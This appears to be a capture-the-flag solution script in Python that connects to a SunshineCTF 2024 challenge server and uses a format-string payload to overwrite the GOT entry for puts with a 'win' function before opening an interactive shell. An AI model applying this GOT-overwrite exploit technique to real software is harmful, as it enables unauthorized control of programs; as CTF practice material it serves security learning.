from gdb_plus import *

FILENAME = './jupiter'
PORT = 24609

e = ELF(FILENAME)
dbg = Debugger(FILENAME, script='init-gef').remote('2024.sunshinectf.games', PORT)
io = dbg.p
dbg.c(wait=False)

io.sendlineafter(b'FL? ', b'0xdeadc0de') # some random check

writes = {
    e.got['puts']: e.sym['win']
}

payload = fmtstr_payload(6, writes) # the string is on top of the stack, so it's the 6th argument
io.sendlineafter(b'?? ', payload)
io.interactive() # :)